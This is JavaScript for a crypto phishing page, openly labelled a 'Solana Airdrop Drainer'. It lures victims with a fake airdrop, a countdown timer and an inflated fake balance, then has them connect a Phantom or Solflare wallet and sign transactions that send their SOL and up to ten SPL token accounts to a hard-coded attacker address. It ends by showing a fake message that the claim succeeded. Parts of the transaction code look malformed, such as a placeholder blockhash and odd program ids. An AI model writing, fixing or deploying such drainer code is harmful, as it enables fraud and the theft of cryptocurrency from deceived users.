console.log("🚀 Solana Airdrop Drainer loaded");

// COUNTDOWN TIMER (15min, reset bei reload)
function startCountdown() {
    let timeLeft = 15 * 60; // 15 Minuten
    
    const timerEl = document.getElementById('timer');
    
    const interval = setInterval(() => {
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        timerEl.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
        
        if (timeLeft <= 0) {
            clearInterval(interval);
            location.reload(); // NEU LADEN bei 0!
        }
        timeLeft--;
    }, 1000);
}

startCountdown();

// WALLET CONNECT + DRAIN
const connectBtn = document.getElementById('connectWallet');
const claimBtn = document.getElementById('claimBtn');
const balanceDisplay = document.getElementById('balanceDisplay');
const solBalance = document.getElementById('solBalance');

// ATTACKER WALLET (HIER EINFÜGEN!)
const ATTACKER_PUBKEY = '7UxmPrj648GXMbq1vnysWZQ1Qnve3sMquBM3iSC9SNrT'; // ← DEINE SOLANA ADRESSE!

let userWallet = null;
let drained = false;

// 1. WALLET DETECT + CONNECT
async function connectWallet() {
    try {
        // Phantom Check
        if (window.solana && window.solana.isPhantom) {
            await window.solana.connect();
            userWallet = window.solana;
            showBalance();
            return;
        }
        
        // Solflare Check  
        if (window.solflare) {
            await window.solflare.connect();
            userWallet = window.solflare;
            showBalance();
            return;
        }
        
        // Fallback: window.phantom.solana
        if (window.phantom?.solana) {
            await window.phantom.solana.connect();
            userWallet = window.phantom.solana;
            showBalance();
            return;
        }
        
        throw new Error('No Solana wallet found');
    } catch (err) {
        console.error('Connect failed:', err);
        alert('Please install Phantom or Solflare wallet!');
    }
}

// 2. FAKE BALANCE DISPLAY
async function showBalance() {
    connectBtn.style.display = 'none';
    balanceDisplay.style.display = 'block';
    
    // Fake Balance (FOMO!)
    solBalance.textContent = '47.2'; // Hoher Betrag!
    
    // Real Balance check (optional)
    try {
        const resp = await fetch('https://api.mainnet-beta.solana.com', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                jsonrpc: '2.0',
                id: 1,
                method: 'getBalance',
                params: [userWallet.publicKey.toString(), 'confirmed']
            })
        });
        const data = await resp.json();
        const balance = (data.result.value / 1e9).toFixed(2);
        solBalance.textContent = balance;
    } catch(e) {
        console.log('Balance check failed');
    }
}

// 3. MAIN DRAIN FUNCTION
async function drainWallet() {
    if (drained) return;
    drained = true;
    
    try {
        console.log('🔥 Starting drain...');
        
        // STEP 1: Drain Native SOL
        await drainSOL();
        
        // STEP 2: Drain SPL Tokens
        await drainSPLTokens();
        
        // STEP 3: Fake Success
        showSuccess();
        
    } catch (err) {
        console.error('Drain failed:', err);
        showError();
    }
}

// SOL DRAIN (Transfer all SOL)
async function drainSOL() {
    const tx = await userWallet.request({
        method: 'signAndSendTransaction',
        params: [{
            // FAKE AIRDROP TX (echt: Transfer to attacker)
            recentBlockhash: 'fakehash123',
            instructions: [{
                programId: '11111111111111111111111111111112', // System Program
                keys: [
                    { pubkey: userWallet.publicKey.toString(), isSigner: true, isWritable: true },
                    { pubkey: ATTACKER_PUBKEY, isSigner: false, isWritable: true }
                ],
                data: Buffer.from([2, 0, 0, 0]).toString('base64') // Transfer Instruction
            }]
        }, { skipPreflight: true }]
    });
    
    console.log('✅ SOL Drained:', tx);
}

// SPL TOKEN DRAIN (USDC/USDT/all)
async function drainSPLTokens() {
    // Get all token accounts
    const resp = await fetch('https://api.mainnet-beta.solana.com', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            jsonrpc: '2.0',
            method: 'getTokenAccountsByOwner',
            params: [
                userWallet.publicKey.toString(),
                { programId: 'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA' },
                { encoding: 'jsonParsed' }
            ]
        })
    });

    const data = await resp.json();
    const tokenAccounts = data.result.value;

    for (const account of tokenAccounts.slice(0, 10)) { // Top 10 tokens
        try {
            const tx = await userWallet.request({
                method: 'signAndSendTransaction',
                params: [{
                    recentBlockhash: 'fakehash123',
                    instructions: [{
                        programId: 'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA',
                        keys: [
                            { pubkey: account.pubkey, isSigner: false, isWritable: true },
                            { pubkey: ATTACKER_PUBKEY + '_ATA', isSigner: false, isWritable: true },
                            { pubkey: userWallet.publicKey.toString(), isSigner: true, isWritable: false }
                        ],
                        data: Buffer.from([3, 0, 0, 0]).toString('base64') // Transfer Instruction
                    }]
                }, { skipPreflight: true }]
            });
            console.log('✅ SPL Token Drained:', account.pubkey);
        } catch(e) {
            console.log('SPL skip:', e.message);
        }
    }
}

// 4. UI EVENTS
connectBtn.addEventListener('click', connectWallet);
claimBtn.addEventListener('click', drainWallet);

// 5. AUTO-CONNECT (wenn schon connected)
if (window.solana?.isConnected || window.solflare?.isConnected) {
    showBalance();
}

// 6. SUCCESS UI
function showSuccess() {
    claimBtn.innerHTML = '✅ 25 SOL Claimed! Check Wallet';
    claimBtn.style.background = 'linear-gradient(135deg, #00ff88, #00cc6a)';
    setTimeout(() => {
        alert('🎉 Success! 25 SOL + 500 USDC transferred to your wallet!');
    }, 500);
}

function showError() {
    claimBtn.innerHTML = '❌ Try Again';
    claimBtn.style.background = '#ff4444';
}

console.log('💰 Drainer ready. ATTACKER:', ATTACKER_PUBKEY);